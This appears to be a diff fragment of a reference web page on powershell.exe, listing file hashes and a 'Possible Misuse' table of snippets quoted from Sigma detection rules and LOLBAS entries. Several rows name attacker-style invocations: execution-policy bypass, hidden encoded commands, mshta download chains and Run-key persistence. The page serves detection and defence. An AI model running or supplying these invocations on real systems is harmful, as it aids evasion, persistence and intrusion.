+      <td><a href="/xcyclopedia/library/powershell.exe-F8278DB78BE164632C57002E82B07813.html">C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe</a></td>
+      <td>88</td>
+    </tr>
+    <tr>
+      <td><a href="/xcyclopedia/library/powershell.exe-5B16D54F2AE6B74DCF863BC0F5E502B5.html">C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</a></td>
+      <td>85</td>
+    </tr>
+    <tr>
+      <td><a href="/xcyclopedia/library/powershell.exe-83767E18DB29B51A804A9E312D0ED99C.html">C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</a></td>
+      <td>91</td>
+    </tr>
+    <tr>
+      <td><a href="/xcyclopedia/library/powershell.exe-BCC5A6493E0641AA1E60CBF69469E579.html">C:\WINDOWS\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</a></td>
+      <td>88</td>
+    </tr>
+    <tr>
+      <td><a href="/xcyclopedia/library/powershell.exe-C32CA4ACFCC635EC1EA6ED8A34DF5FAC.html">C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</a></td>
+      <td>85</td>
+    </tr>
+    <tr>
+      <td><a href="/xcyclopedia/library/powershell.exe-EF8FA4F195C6239273C100AB370FCFDC.html">C:\windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</a></td>
+      <td>79</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="possible-misuse">Possible Misuse</h2>
+
+<p><em>The following table contains possible examples of <code class="language-plaintext highlighter-rouge">powershell.exe</code> being misused. While <code class="language-plaintext highlighter-rouge">powershell.exe</code> is <strong>not</strong> inherently malicious, its legitimate functionality can be abused for malicious purposes.</em></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Source</th>
+      <th>Source File</th>
+      <th>Example</th>
+      <th>License</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/other/godmode_sigma_rule.yml">godmode_sigma_rule.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/file_event/sysmon_creation_system_file.yml">sysmon_creation_system_file.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/file_event/sysmon_susp_adsi_cache_usage.yml">sysmon_susp_adsi_cache_usage.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- 'C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_in_memory_powershell.yml">sysmon_in_memory_powershell.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">description: Detects loading of essential DLL used by PowerShell, but not by the process powershell.exe. Detects meterpreter's "load powershell" extension.</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_in_memory_powershell.yml">sysmon_in_memory_powershell.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_suspicious_dbghelp_dbgcore_load.yml">sysmon_suspicious_dbghelp_dbgcore_load.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/network_connection/sysmon_powershell_network_connection.yml">sysmon_powershell_network_connection.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Image: '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_alternate_powershell_hosts.yml">powershell_alternate_powershell_hosts.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">description: Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_alternate_powershell_hosts.yml">powershell_alternate_powershell_hosts.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- ContextInfo: 'powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_alternate_powershell_hosts.yml">powershell_alternate_powershell_hosts.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Message: 'powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_suspicious_invocation_specific.yml">powershell_suspicious_invocation_specific.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*powershell.exe reg add HKCU\software\microsoft\windows\currentversion\run*'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/sysmon_apt_muddywater_dnstunnel.yml">sysmon_apt_muddywater_dnstunnel.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_babyshark.yml">win_apt_babyshark.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- powershell.exe mshta.exe http*</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_wocao.yml">win_apt_wocao.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- 'cmd /c powershell.exe -ep bypass -file c:\s.ps1'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_dnscat2_powershell_implementation.yml">win_dnscat2_powershell_implementation.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">ParentImage\|endswith: '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_exploit_cve_2020_10189.yml">win_exploit_cve_2020_10189.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_html_help_spawn.yml">win_html_help_spawn.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mmc_spawn_shell.yml">win_mmc_spawn_shell.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_spawn_shell.yml">win_mshta_spawn_shell.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_multiple_suspicious_cli.yml">win_multiple_suspicious_cli.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- powershell.exe</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_new_service_creation.yml">win_new_service_creation.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Image\|endswith: '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_non_interactive_powershell.yml">win_non_interactive_powershell.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">description: Detects non-interactive PowerShell activity by looking at powershell.exe with not explorer.exe as a parent.</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_non_interactive_powershell.yml">win_non_interactive_powershell.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Image\|endswith: '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml">win_office_shell.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_powershell_bitsjob.yml">win_powershell_bitsjob.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Image\|endswith: '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_powershell_downgrade_attack.yml">win_powershell_downgrade_attack.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Image\|endswith: '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_powershell_download.yml">win_powershell_download.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Image: '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_powershell_suspicious_parameter_variation.yml">win_powershell_suspicious_parameter_variation.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\Powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_powersploit_empire_schtasks.yml">win_powersploit_empire_schtasks.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_remote_time_discovery.yml">win_remote_time_discovery.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Image\|endswith: '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml">win_renamed_binary.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- 'powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml">win_renamed_binary.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary_highly_relevant.yml">win_renamed_binary_highly_relevant.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- "powershell.exe"</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary_highly_relevant.yml">win_renamed_binary_highly_relevant.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_powershell.yml">win_renamed_powershell.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_run_powershell_script_from_ads.yml">win_run_powershell_script_from_ads.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">ParentImage\|endswith: '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_run_powershell_script_from_ads.yml">win_run_powershell_script_from_ads.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Image\|endswith: '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_creation.yml">win_shadow_copies_creation.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_deletion.yml">win_shadow_copies_deletion.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shell_spawn_susp_program.yml">win_shell_spawn_susp_program.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_crackmapexec_execution.yml">win_susp_crackmapexec_execution.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*powershell.exe -exec bypass -noni -nop -w 1 -C "*'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_crackmapexec_execution.yml">win_susp_crackmapexec_execution.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*powershell.exe -noni -nop -w 1 -enc *'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_crackmapexec_powershell_obfuscation.yml">win_susp_crackmapexec_powershell_obfuscation.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">CommandLine\|contains: 'powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_eventlog_clear.yml">win_susp_eventlog_clear.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Image\|endswith: '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_powershell_hidden_b64_cmd.yml">win_susp_powershell_hidden_b64_cmd.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Image: '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_powershell_parent_combo.yml">win_susp_powershell_parent_combo.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_powershell_parent_process.yml">win_susp_powershell_parent_process.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">description: Detects a suspicious parents of powershell.exe</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_regsvr32_anomalies.yml">win_susp_regsvr32_anomalies.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">ParentImage: '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_shell_spawn_from_mssql.yml">win_susp_shell_spawn_from_mssql.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_use_of_csharp_console.yml">win_susp_use_of_csharp_console.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">ParentImage\|endswith: '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_system_exe_anomaly.yml">win_system_exe_anomaly.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_webshell_spawn.yml">win_webshell_spawn.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_wmi_spwns_powershell.yml">win_wmi_spwns_powershell.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_alternate_powershell_hosts_pipe.yml">sysmon_alternate_powershell_hosts_pipe.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">description: Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_alternate_powershell_hosts_pipe.yml">sysmon_alternate_powershell_hosts_pipe.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_remote_thread.yml">sysmon_suspicious_remote_thread.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_susp_powershell_rundll32.yml">sysmon_susp_powershell_rundll32.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">SourceImage: '*\powershell.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Powershell.yml">Powershell.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Name: Powershell.exe</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Powershell.yml">Powershell.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Powershell.yml">Powershell.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Agentexecutor.yml">Agentexecutor.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Description: Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument</code></td>
+      <td> </td>
